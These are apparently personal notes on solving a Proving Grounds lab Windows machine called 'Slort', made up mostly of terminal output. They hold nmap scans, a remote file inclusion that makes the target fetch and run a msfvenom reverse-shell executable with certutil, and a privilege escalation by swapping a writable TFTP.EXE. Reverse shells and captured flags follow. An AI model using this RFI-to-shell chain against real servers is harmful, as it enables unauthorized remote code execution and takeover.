---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/sqli
  - tech/web/lfi-rfi
  - tech/web/xss
  - tech/db/mysql
  - tech/svc/ftp
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.62.53
ports: [21, 135, 139, 445, 3306, 4443, 8080]
services: [ftp, http, microsoft-ds, msrpc, mysql, netbios-ssn]
cves: [CVE-2007-6750, CVE-2012-1182]
status: solved
tech_count: 7
---
```bash
???(kali?kali)-[~/Slort]
??$ sudo nmap -sV -sC -p- -O 192.168.62.53 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 05:21 +0000
Stats: 0:21:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.95% done; ETC: 05:43 (0:00:53 remaining)
Stats: 0:21:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.96% done; ETC: 05:43 (0:00:53 remaining)
Stats: 0:21:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.98% done; ETC: 05:43 (0:00:53 remaining)
Nmap scan report for 192.168.62.53
Host is up (0.00049s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.62.53:4443/dashboard/
5040/tcp  open  unknown
7680/tcp  open  tcpwrapped
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.62.53:8080/dashboard/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1903 - 21H1
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-06-30T05:46:09
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1488.14 seconds
                                                                   
																   
																   
???(kali?kali)-[~/Slort]
??$ sudo nmap -sVC -vvv 192.168.62.53 --script vuln
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 05:50 +0000
NSE: Loaded 152 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:50
Completed NSE at 05:50, 10.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:50
Completed NSE at 05:50, 0.00s elapsed
Initiating Ping Scan at 05:50
Scanning 192.168.62.53 [4 ports]
Completed Ping Scan at 05:50, 0.01s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:50
Completed Parallel DNS resolution of 1 host. at 05:50, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:50
Scanning 192.168.62.53 [1000 ports]
Discovered open port 21/tcp on 192.168.62.53
Discovered open port 135/tcp on 192.168.62.53
Discovered open port 445/tcp on 192.168.62.53
Discovered open port 139/tcp on 192.168.62.53
Discovered open port 3306/tcp on 192.168.62.53
Discovered open port 8080/tcp on 192.168.62.53
Increasing send delay for 192.168.62.53 from 0 to 5 due to 48 out of 158 dropped probes since last increase.
Increasing send delay for 192.168.62.53 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Increasing send delay for 192.168.62.53 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
Discovered open port 4443/tcp on 192.168.62.53
Completed SYN Stealth Scan at 05:50, 17.72s elapsed (1000 total ports)
Initiating Service scan at 05:50
Scanning 7 services on 192.168.62.53
Completed Service scan at 05:50, 6.04s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.62.53.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:50
NSE Timing: About 99.24% done; ETC: 05:51 (0:00:00 remaining)
NSE Timing: About 99.35% done; ETC: 05:51 (0:00:00 remaining)
NSE Timing: About 99.35% done; ETC: 05:52 (0:00:01 remaining)
NSE Timing: About 99.35% done; ETC: 05:52 (0:00:01 remaining)
NSE Timing: About 99.35% done; ETC: 05:53 (0:00:01 remaining)
NSE Timing: About 99.35% done; ETC: 05:53 (0:00:01 remaining)
NSE Timing: About 99.35% done; ETC: 05:54 (0:00:01 remaining)
NSE Timing: About 99.35% done; ETC: 05:54 (0:00:02 remaining)
NSE Timing: About 99.35% done; ETC: 05:55 (0:00:02 remaining)
NSE Timing: About 99.35% done; ETC: 05:55 (0:00:02 remaining)
Completed NSE at 05:55, 311.80s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:55
Completed NSE at 05:55, 0.11s elapsed
Nmap scan report for 192.168.62.53
Host is up, received reset ttl 127 (0.00038s latency).
Scanned at 2026-06-30 05:50:17 UTC for 336s
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3306/tcp open  mysql         syn-ack ttl 127 MariaDB 10.3.24 or later (unauthorized)
4443/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-trace: TRACE is enabled
| Headers:
| Date: Tue, 30 Jun 2026 05:50:44 GMT
| Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.62.53:4443/dashboard/javascripts/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.62.53:4443/dashboard/javascripts/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.62.53:4443/dashboard/javascripts/?C=N%3BO%3DD%27%20OR%20sqlspider
|_    http://192.168.62.53:4443/dashboard/javascripts/?C=S%3BO%3DA%27%20OR%20sqlspider
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.43 (win64) openssl/1.1.1g php/7.4.6'
8080/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-trace: TRACE is enabled
| Headers:
| Date: Tue, 30 Jun 2026 05:50:42 GMT
| Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| Connection: close
| Transfer-Encoding: chunked
|_Content-Type: message/http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.62.53:8080/dashboard/javascripts/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.62.53:8080/dashboard/javascripts/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.62.53:8080/dashboard/javascripts/?C=N%3BO%3DD%27%20OR%20sqlspider
|_    http://192.168.62.53:8080/dashboard/javascripts/?C=S%3BO%3DA%27%20OR%20sqlspider
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-enum: 
|   /icons/: Potentially interesting folder w/ directory listing
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.43 (win64) openssl/1.1.1g php/7.4.6'
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 05:55
Completed NSE at 05:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 05:55
Completed NSE at 05:55, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 346.48 seconds
           Raw packets sent: 1080 (47.496KB) | Rcvd: 1001 (40.068KB)


http://192.168.62.53:4443/site/index.php?page=http://192.168.49.62/halo


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.62 LPORT=135 -f exe > rev.exe


step1.php
<?php 
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.62/rev.exe" rev.exe', $val); 
?>

step2.php
<?php 
$exec = system('rev.exe', $val); 
?>



curl -i http://192.168.62.53:4443/site/index.php?page=http://192.168.49.62/step1.php
curl -i http://192.168.62.53:4443/site/index.php?page=http://192.168.49.62/step2.php



???(kali?kali)-[~/Slort]
??$ curl -i http://192.168.62.53:4443/site/index.php?page=http://192.168.49.62/step1.php
HTTP/1.1 200 OK
Date: Tue, 30 Jun 2026 07:33:11 GMT
Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
X-Powered-By: PHP/7.4.6
Content-Length: 94
Content-Type: text/html; charset=UTF-8

****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.
                                                                                                          
???(kali?kali)-[~/Slort]
??$ curl -i http://192.168.62.53:4443/site/index.php?page=http://192.168.49.62/step2.php

???(kali?kali)-[~/Slort]
??$ python -m http.server 80                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.62.53 - - [30/Jun/2026 07:33:11] "GET /step1.php HTTP/1.0" 200 -
192.168.62.53 - - [30/Jun/2026 07:33:11] "GET /rev.exe HTTP/1.1" 200 -
192.168.62.53 - - [30/Jun/2026 07:33:11] "GET /rev.exe HTTP/1.1" 200 -
192.168.62.53 - - [30/Jun/2026 07:33:27] "GET /step2.php HTTP/1.0" 200 -



???(kali?kali)-[~/Slort]
??$ nc -lvnp 135 
listening on [any] 135 ...
connect to [192.168.49.62] from (UNKNOWN) [192.168.62.53] 50840
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\site>whoami
whoami
slort\rupert


C:\Users\rupert\Desktop>type local.txt
type local.txt
5246dfc4e221ec9095b0ba25315720a2



C:\Backup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

07/20/2020  07:08 AM    <DIR>          .
07/20/2020  07:08 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/23/2020  07:49 PM            73,802 TFTP.EXE
               3 File(s)         85,179 bytes
               2 Dir(s)  28,600,422,400 bytes free

C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)



C:\Users\rupert\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled



msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.62 LPORT=445 -f exe > rev2.exe


C:\Backup>certutil -urlcache -split -f http://192.168.49.62/rev2.exe
certutil -urlcache -split -f http://192.168.49.62/rev2.exe
****  Online  ****
  0000  ...
  1e00
CertUtil: -URLCache command completed successfully.

C:\Backup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Backup

06/30/2026  12:59 AM    <DIR>          .
06/30/2026  12:59 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
06/30/2026  12:59 AM             7,680 rev2.exe
06/23/2020  07:49 PM            73,802 TFTP.EXE
               4 File(s)         92,859 bytes
               2 Dir(s)  28,600,840,192 bytes free

C:\Backup>move TFTP.EXE TFTP.EXE.bak
move TFTP.EXE TFTP.EXE.bak
        1 file(s) moved.

C:\Backup>move rev2.exe TFTP.EXE
move rev2.exe TFTP.EXE
        1 file(s) moved.



???(kali?kali)-[~/Slort]
??$ sudo nc -lvnp 445                           
listening on [any] 445 ...
connect to [192.168.49.62] from (UNKNOWN) [192.168.62.53] 50992
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
slort\administrator

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6E11-8C59

 Directory of C:\Users\Administrator\Desktop

05/04/2022  01:30 AM    <DIR>          .
05/04/2022  01:30 AM    <DIR>          ..
05/04/2022  01:21 AM    <DIR>          PG
06/29/2026  10:20 PM                34 proof.txt
               1 File(s)             34 bytes
               3 Dir(s)  28,603,846,656 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
50597e13dcfddd496ebf3e9f88aa2cd5



```